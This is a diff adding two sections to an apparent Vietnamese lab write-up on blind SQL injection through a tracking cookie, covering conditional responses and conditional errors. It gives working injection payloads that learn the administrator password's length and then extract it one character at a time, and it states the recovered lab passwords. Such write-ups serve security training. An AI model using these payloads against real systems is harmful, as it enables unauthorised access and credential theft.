@@ -109,3 +109,37 @@ SELECT tất cả các giá trị trong hai columns "USERNAME_SAMKHP" và "PASSW
 Sử dụng thông tin đã có để đăng nhập, kết quả thành công.
 
 # 11. Blind SQL injection with conditional responses
+Chức năng tracking của website có lỗi SQLi.
+
+Khi thay đổi TrackingId thành `ah7mfSgFKxjX3Exh' and 1=(select case when(1=1) then 1 else 2 end)--` thì dòng "Welcome back" được hiển thị, còn nếu thay đổi `1=1` thành `1=2` thì lại không xuất hiện. Như vậy ta sẽ tấn công sử dụng conditional responses.
+
+![image](https://user-images.githubusercontent.com/103978452/201892778-461be474-8dec-463a-823d-b4c18580e821.png)
+
+Thay đổi TrackingId thành `ah7mfSgFKxjX3Exh' and 1=(select case when length(password)=10 then 1 else 2 end)--` rồi thực hiện bruteforce với độ dài password từ 1 đến 30. Ta thấy chỉ với length=20 thì dòng "Welcome back" mới xuất hiện.
+
+![image](https://user-images.githubusercontent.com/103978452/201893944-f1d76799-4488-44aa-9b2f-6cf6b195a259.png)
+
+Thay đổi TrackingId thành `ah7mfSgFKxjX3Exh' and 1=(select case when substring(password,1,1)='a' then 1 else 2 end from users where username='administrator')--` rồi tiến hành bruteforce với các giá trị từ a-z, 0-9. Ta thấy chỉ với giá trị 'm' thì "Welcome back" mới xuất hiện. Như vậy ký tự đầu tiên của password là 'm'.
+
+![image](https://user-images.githubusercontent.com/103978452/201895967-446f92d4-b59f-4eb9-b061-6632785f5944.png)
+
+Tiến hành tương tự với các ký tự còn lại từ 2 đến 20, ta thu được password là "mqljyhp93s7hu2zqpmid". Sử dụng thông tin thu được để đăng nhập, kết quả thành công.
+
+# 12. Blind SQL injection with conditional errors
+Chức năng tracking của website có lỗi SQLi.
+
+Ta thay đổi cookie TrackingId thành `tjUeQ8E2Evymji7b' and 1=(select case when (1=1) then to_char(1/0) else null end from dual)--` thì thấy kết quả trả về lỗi, còn nếu thay `1=1` thành `1=0` thì sẽ không hiển thị lỗi. Như vậy ta sẽ tấn công sử dụng conditional errors.
+
+![image](https://user-images.githubusercontent.com/103978452/201891180-f9f5e10c-b51c-49ea-9f88-671fb8e270e1.png)
+
+Thay cookie TrackingId thành `tjUeQ8E2Evymji7b' and 1=(select case when length(password)=10 then to_char(1/0) else null end from users where username='administrator')--` rồi thực hiện bruteforce với độ dài của password, ta thấy chỉ với length=20 thì kết quả trả về error.
+
+![image](https://user-images.githubusercontent.com/103978452/201885945-0373c361-109b-4a37-9575-f20d1e7736bb.png)
+
+Thay đổi cookie TrackingId thành `tjUeQ8E2Evymji7b' and 1=(select case when substr(password,1,1)='a' then to_char(1/0) else null end from users where username='administrator')--` rồi tiến hành bruteforce với các giá trị từ a-z, 0-9. Ta thấy chỉ với ký tự 'f' thì mới xuất hiện lỗi. Như vậy ký tự đầu tiên của password là 'f'.
+
+![image](https://user-images.githubusercontent.com/103978452/201889390-0037c0b0-8e52-4253-872d-66e074efeb18.png)
+
+Thực hiện tương tự với `substr(password,2,1)`, `substr(password,3,1)`, ... đến `substr(password,20,1)`, cuối cùng ta thu được password="f4l51zsvc29fylpb93sa".
+
+Sử dụng thông tin đã có để đăng nhập, kết quả thành công.
